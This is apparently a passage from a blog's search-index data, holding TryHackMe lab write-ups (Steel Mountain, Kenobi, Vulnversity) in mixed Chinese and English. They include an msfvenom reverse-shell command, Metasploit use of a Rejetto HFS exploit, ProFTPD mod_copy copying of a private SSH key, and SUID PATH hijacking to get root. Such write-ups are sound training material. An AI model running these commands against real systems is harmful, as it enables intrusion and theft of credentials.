","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:2:0","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"Scan the machine with nmap. What is the other port running a web server on? 另外一个跑web服务的端口：8080 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:2:1","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"Take a look at the other web server. What file server is running? 看一下8080端口，文件服务器： Rejetto HTTP File Server ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:2:2","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"What is the CVE number to exploit this file server? ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ searchsploit rejetto | grep 2.3 Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload | multiple/remote/30850.txt Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | windows/webapps/34852.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | windows/remote/34668.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ searchsploit -p 39161 Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) URL: https://www.exploit-db.com/exploits/39161 Path: /usr/share/exploitdb/exploits/windows/remote/39161.py Codes: CVE-2014-6287, OSVDB-111386 Verified: True File Type: Python script, ASCII text executable, with very long lines (540) CVE-2014-6287 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:2:3","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"Use Metasploit to get an initial shell. What is the user flag? 使用msf： msf6 \u003e search 2014-6287 msf6 \u003e use 0 msf6 exploit(windows/http/rejetto_hfs_exec) \u003e set rhost 10.10.33.145 msf6 exploit(windows/http/rejetto_hfs_exec) \u003e set rport 8080 msf6 exploit(windows/http/rejetto_hfs_exec) \u003e run 拿到shell之后去dekstop找到user.txt，内容即为flag。 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:2:4","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"Privilege Escalation 这里使用了一个powershell脚本https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1。（该脚本是一个基于poweshell的提权功能脚本，包含了很多功能，后续会出专门的文章对该工具的使用进行详解。） 上传到目标机器，然后执行： 然后启动powershell扩展： 执行上传的脚本: ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:3:0","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"What is the name of the service which shows up as an unquoted service path vulnerability? 存在问题的服务的名称：AdvancedSystemCareService9 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:3:1","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"What is the root flag? The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program! Use msfvenom to generate a reverse shell as an Windows executable. msfvenom -p windows/shell_reverse_tcp LHOST=10.10.30.241 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe Upload your binary and replace the legitimate one. Then restart the program to get a shell as root. 本地生成payload之后，首先暂停掉目标服务AdvancedSystemCareService9，然后上传payload： 本地监听端口，重新进入shell启动服务，拿到system权限： ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:3:2","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"Access and Escalation without Metasploit 不使用msf重新走一遍上面的流程。 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:4:0","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"1. 下载exp 可以直接使用searchsploit中的，也可以下载https://www.exploit-db.com/raw/39161 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:4:1","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"2. 修改port/ip 修改exp中的攻击机的ip和监听端口 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:4:2","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"3. 开启一个web server，上传一个netcat.exe 这个exp需要使用natcat.exe来发起一个连接请求，所以需要上传一个netcat.exe到目标机器。采用的方式是python开启一个web server，然后上传。默认使用80，如果要修改这个端口，就要在exp的vbs变量中的ip_addr的后面加上:[port]字符串。 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:4:3","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"4. 开启web server，监听端口 netcat.exe放在web server目录下，同时开启端口监听 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:4:4","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"5. 运行exp，获取反弹shell 我这里通过VPN连接的kali怎么都弹不回来-。-不浪费时间了 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:4:5","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"6. 使用winPEAS 下载winPEAS： powershell -c wget \"http://\u003cip\u003e:8000/winPEAS.exe\" -outfile \"winPEAS.exe\" ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:4:6","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"7. 运行winPEAS，发现弱点 运行winPEAS，找到存在漏洞的服务： 后续使用就是生成提权payload，stop服务，上传payload，替换exe，start服务，获得shell。 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:4:7","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"总结 扫 -\u003e 找洞 -\u003e 打 -\u003e 提 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:5:0","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"THM学习训练记录","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"THM - Kenobi ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:0:0","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"Deploy the vulneable machine ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:1:0","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"Scan the machine with nmap, how many ports are open? nmap扫描端口： ┌──(v4ler1an㉿kali)-[~/Documents/tools/nessus] └─$ sudo nmap -T4 -sV 10.10.46.200 [sudo] password for v4ler1an: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 22:14 EST Nmap scan report for localhost (10.10.46.200) Host is up (0.46s latency). Not shown: 991 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 111/tcp open rpcbind 2-4 (RPC #100000) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 545/tcp filtered ekshell 636/tcp filtered ldapssl 2049/tcp open nfs 2-4 (RPC #100003) Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 39.25 seconds ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:1:1","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"Enumerating Samba for shares ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:2:0","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"Using the nmap command above, how many shares have been found? 使用nmap的针对smb服务的脚本进行扫描： ┌──(v4ler1an㉿kali)-[~/Documents/tools/nessus] └─$ sudo nmap -T4 -p445 --script=smb-enum-shares,smb-enum-users 10.10.46.200 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 22:16 EST Nmap scan report for localhost (10.10.46.200) Host is up (0.53s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.46.200\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: IPC Service (kenobi server (Samba, Ubuntu)) | Users: 1 | Max Users: \u003cunlimited\u003e | Path: C:\\tmp | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.46.200\\anonymous: | Type: STYPE_DISKTREE | Comment: | Users: 0 | Max Users: \u003cunlimited\u003e | Path: C:\\home\\kenobi\\share | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.46.200\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 0 | Max Users: \u003cunlimited\u003e | Path: C:\\var\\lib\\samba\\printers | Anonymous access: \u003cnone\u003e |_ Current user access: \u003cnone\u003e Nmap done: 1 IP address (1 host up) scanned in 77.69 seconds ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:2:1","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"Once you’re connected, list the files on the share. What is the file can you see? 使用smbclient连接anonymous共享目录，密码为空： ┌──(v4ler1an㉿kali)-[~/Documents/tools] └─$ smbclient //10.10.46.200/anonymous Password for [WORKGROUP\\v4ler1an]: Try \"help\" to get a list of possible commands. smb: \\\u003e help ? allinfo altname archive backup blocksize cancel case_sensitive cd chmod chown close del deltree dir du echo exit get getfacl geteas hardlink help history iosize lcd link lock lowercase ls l mask md mget mkdir more mput newer notify open posix posix_encrypt posix_open posix_mkdir posix_rmdir posix_unlink posix_whoami print prompt put pwd q queue quit readlink rd recurse reget rename reput rm rmdir showacls setea setmode scopy stat symlink tar tarmode timeout translate unlock volume vuid wdel logon listconnect showconnect tcon tdis tid utimes logoff .. ! smb: \\\u003e ls . D 0 Wed Sep 4 06:49:09 2019 .. D 0 Wed Sep 4 06:56:07 2019 log.txt N 12237 Wed Sep 4 06:49:09 2019 9204224 blocks of size 1024. 6877092 blocks available ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:2:2","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"What port is FTP running on? 下载log.txt文件： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ smbclient //10.10.46.200/anonymous Password for [WORKGROUP\\v4ler1an]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Wed Sep 4 06:49:09 2019 .. D 0 Wed Sep 4 06:56:07 2019 log.txt N 12237 Wed Sep 4 06:49:09 2019 9204224 blocks of size 1024. 6877116 blocks available smb: \\\u003e get log.txt getting file \\log.txt of size 12237 as log.txt (7.2 KiloBytes/sec) (average 7.2 KiloBytes/sec) smb: \\\u003e exit 查看该日志文件，可以发现FTP的运行端口： # This is a basic ProFTPD configuration file (rename it to # 'proftpd.conf' for actual use. It establishes a single server # and a single anonymous login. It assumes that you have a user/group # \"nobody\" and \"ftp\" for normal operation and anon. ServerName \"ProFTPD Default Installation\" ServerType standalone DefaultServer on # Port 21 is the standard FTP port. Port 21 ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:2:3","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"What mount can we see? Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this. 使用nmap脚本扫描： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sudo nmap -T4 -p111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.46.200 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 22:27 EST Nmap scan report for localhost (10.10.46.200) Host is up (0.47s latency). PORT STATE SERVICE 111/tcp open rpcbind | nfs-showmount: |_ /var * | nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink |_ /var 9204224.0 1836516.0 6877112.0 22% 16.0T 32000 | nfs-ls: Volume /var | access: Read Lookup NoModify NoExtend NoDelete NoExecute | PERMISSION UID GID SIZE TIME FILENAME | rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 . | rwxr-xr-x 0 0 4096 2019-09-04T12:27:33 .. | rwxr-xr-x 0 0 4096 2019-09-04T12:09:49 backups | rwxr-xr-x 0 0 4096 2019-09-04T10:37:44 cache | rwxrwxrwx 0 0 4096 2019-09-04T08:43:56 crash | rwxrwsr-x 0 50 4096 2016-04-12T20:14:23 local | rwxrwxrwx 0 0 9 2019-09-04T08:41:33 lock | rwxrwxr-x 0 108 4096 2019-09-04T10:37:44 log | rwxr-xr-x 0 0 4096 2019-01-29T23:27:41 snap | rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 www |_ Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:2:4","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"Gain initial access with ProFtpd ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:3:0","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"What is the version? 前面服务扫描的时候已经获得，1.3.5 ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:3:1","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"How many exploits are there for the ProFTPd running? 使用searchsploit搜索一下相关的exp数量： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ searchsploit ProFtpd |grep 1.3.5 ProFTPd 1.3.5 - File Copy | linux/remote/36742.txt ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.py ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution | linux/remote/36803.py ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:3:2","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"What is Kenobi’s user flag (/home/kenobi/user.txt)? The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 利用SITE CPFR 和 SITE CPTO实现文件copy，copy位置是挂载的/var路径： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ nc 10.10.46.200 21 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.46.200] SITE CPFR /home/kenobi/.ssh/id_rsa 350 File or directory exists, ready for destination name SITE CPTO /var/tmp/id_rsa 250 Copy successful We knew that the /var directory was a mount we could see. So we’ve now moved Kenobi’s private key to the /var/tmp directory. 把/var/tmp挂载到我们自己的机器上： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ mkdir /mnt/kenobiNFS mkdir: cannot create directory ‘/mnt/kenobiNFS’: Permission denied ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sudo mmkdir /mnt/kenobiNFS sudo: mmkdir: command not found ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sudo mkdir /mnt/kenobiNFS ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ cd /mnt ┌──(v4ler1an㉿kali)-[/mnt] └─$ ls ls: cannot access 'hgfs': Input/output error hgfs kenobiNFS ┌──(v4ler1an㉿kali)-[/mnt] └─$ sudo mount 10.10.46.200:/var/tmp /mnt/kenobiNFS ┌──(v4ler1an㉿kali)-[/mnt] └─$ ls -la /mnt/kenobiNFS total 28 drwxrwxrwt 6 root root 4096 Mar 5 22:39 . drwxr-xr-x 4 root root 4096 Mar 5 22:41 .. -rw-r--r-- 1 v4ler1an v4ler1an 1675 Mar 5 22:39 id_rsa drwx------ 3 root root 4096 Sep 4 2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM drwx------ 3 root root 4096 Sep 4 2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw drwx------ 3 root root 4096 Sep 4 2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn drwx------ 3 root root 4096 Mar 5 22:12 systemd-private-ee05fedf0dd847fabad553360be89561-systemd-timesyncd.service-0uazTq 此时可以拿到id_rsa文件，我们就用这个文件去远程连接ssh： ┌──(v4ler1an㉿kali)-[/mnt] └─$ cp /mnt/kenobiNFS/id_rsa ~/Documents/tmp/id_rsa ┌──(v4ler1an㉿kali)-[/mnt] └─$ cd ~/Documents/tmp/ ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ chmod 600 id_rsa ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ ssh -i ./id_rsa kenobi@10.10.46.200 The authenticity of host '10.10.46.200 (10.10.46.200)' can't be established. ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.46.200' (ED25519) to the list of known hosts. Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 103 packages can be updated. 65 updates are security updates. Last login: Wed Sep 4 07:10:15 2019 from 192.168.1.147 To run a command as administrator (user \"root\"), use \"sudo \u003ccommand\u003e\". See \"man sudo_root\" for details. kenobi@kenobi:~$ ls share user.txt kenobi@kenobi:~$ cat user.txt d0b0f3f53b6caa532a83915e19224899 ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:3:3","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"Privilege Escalation with Path Variable Manipulation ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:4:0","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"What file looks particularly out of the ordinary? 检查SUID文件： kenobi@kenobi:~$ find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\; -rwsr-xr-x 1 root root 94240 May 8 2019 /sbin/mount.nfs -rwsr-xr-x 1 root root 14864 Jan 15 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-sr-x 1 root root 98440 Jan 29 2019 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 428240 Jan 31 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 38984 Jun 14 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -rwsr-xr-x 1 root root 49584 May 16 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 32944 May 16 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 23376 Jan 15 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 54256 May 16 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 32944 May 16 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 75304 May 16 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 8880 Sep 4 2019 /usr/bin/menu -rwsr-xr-x 1 root root 136808 Jul 4 2017 /usr/bin/sudo -rwsr-xr-x 1 root root 40432 May 16 2017 /usr/bin/chsh -rwsr-sr-x 1 daemon daemon 51464 Jan 14 2016 /usr/bin/at -rwsr-xr-x 1 root root 39904 May 16 2017 /usr/bin/newgrp -rwsr-xr-x 1 root root 27608 May 16 2018 /bin/umount -rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40152 May 16 2018 /bin/mount -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping -rwsr-xr-x 1 root root 40128 May 16 2017 /bin/su -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6 这里的可疑文件就是/usr/bin/menu，没有发现其他能利用的SUID的程序。 ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:4:1","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"Run the binary, how many options appear? kenobi@kenobi:~$ /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice :1 HTTP/1.1 200 OK Date: Wed, 06 Mar 2024 03:50:41 GMT Server: Apache/2.4.18 (Ubuntu) Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT ETag: \"c8-591b6884b6ed2\" Accept-Ranges: bytes Content-Length: 200 Vary: Accept-Encoding Content-Type: text/html 选项1好像做了一个web请求。 使用strings查看menu中包含的明文字符串： ... .. 2. kernel version 3. ifconfig ** Enter your choice : curl -I localhost uname -r ifconfig Invalid choice ... ... 发现它会调用curl程序，该程序属性如下： kenobi@kenobi:~$ which curl /usr/bin/curl kenobi@kenobi:~$ ll /usr/bin/curl -rwxr-xr-x 1 root root 190408 Jan 29 2019 /usr/bin/curl* 那我们这里的思路就是在当前的shell中添加一个环境变量，在新添加的环境变量中为在一个curl程序，让他去调用bash或者sh。 kenobi@kenobi:~$ cd /tmp kenobi@kenobi:/tmp$ echo /bin/sh \u003e curl --\u003e 在/tmp下伪造一个curl kenobi@kenobi:/tmp$ chmod 777 curl --\u003e 修改一下权限 kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH --\u003e 修改PATH环境变量，/tmp路径放在最前面 最后，我们在当前环境变量下去调用menu，让它去调用伪造的curl： kenobi@kenobi:/tmp$ /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice :1 # id uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare) # cat /root/root.txt 177b3cd8562289f37382721c28381f02 ","date":"2024-01-03","objectID":"/2024/01/thm-kenobi/:4:2","tags":["THM"],"title":"TryHackMe -- Kenobi","uri":"/2024/01/thm-kenobi/"},{"categories":["Pentesting"],"content":"THM学习训练记录","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"THM - Vulnversity ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:0:0","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"Reconnaissance ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:1:0","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"Scan the box; how many ports are open? nmap扫描，同时扫一下服务： ┌──(v4ler1an㉿kali)-[~/tmp] └─$ sudo nmap -T4 -sV 10.10.189.32 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 20:51 EST Nmap scan report for localhost (10.10.189.32) Host is up (0.35s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.45 seconds ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:1:1","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"What version of the squid proxy is running on the machine? squid proxy的版本，使用-sV参数直接确定扫描的端口对应的服务，3.5.12。 ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:1:2","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"How many ports will Nmap scan if the flag -p-400 was used? 范围扫描端口，这里会扫描0-400的端口范围。 ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:1:3","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"What is the most likely operating system this machine is running? 具体发行版本根据22端口的ssh服务可以确定是ubuntu。 ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:1:4","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"What port is the web server running on? web服务，看运行的web组件-Apache就可以，端口为3333。 ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:1:5","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"What is the flag for enabling verbose mode using Nmap? 查看nmap运行过程中的具体信息，使用-v或者-vv选项。 ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:1:6","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"Locating directories using Gobuster ","date":"2024-01-02","objectID":"/2024/01/thm-vulnversity/:2:0","tags":["THM"],"title":"TryHackMe -- Vulnversity","uri":"/2024/01/thm-vulnversity/"},{"categories":["Pentesting"],"content":"What is the directory that has an upload form page? 首先访问一下3333端口的web服务，没有发现任何的输入框和按钮，然后使用gobuster进行目录扫描： ┌──(v4ler1an㉿kali)-[~/tmp/nmap] └─$ gobuster dir -u http://10.10.189.32:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 64 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.189.32:3333 [+] Method: GET [+] Threads: 64 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 320] [--\u003e http://10.10.189.32:3333/images/] /css (Status: 301) [Size: 317] [--\u003e http://10.10.189.32:3333/css/] /js (Status: 301) [Size: 316] [--\u003e http://10.10.189.32:3333/js/] /fonts (Status: 301) [Size: 319] [--\u003e http://10.10.189.32:3333/fonts/] /internal (Status: 301) [Size: 322] [--\u003e http://10.10.189.32:3333/internal/] Progress: 7194 / 87665 (8.21%)^C [!] Keyboard interrupt detected, terminating. Progress: 7275 / 87665 (8.30%) =============================================================== Finished =============================================================== ┌──(v4ler1an㉿kali)-[~/tmp/nmap] └─$ gobuster dir -u http://10.10.189.32:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 64 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.189.32:3333/internal/ [+] Method: GET [+] Threads: 64 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /uploads (Status: 301) [Size: 330] [--\u003e http://10.10.189.32:3333/internal/uploads/] /css (Status: 301) 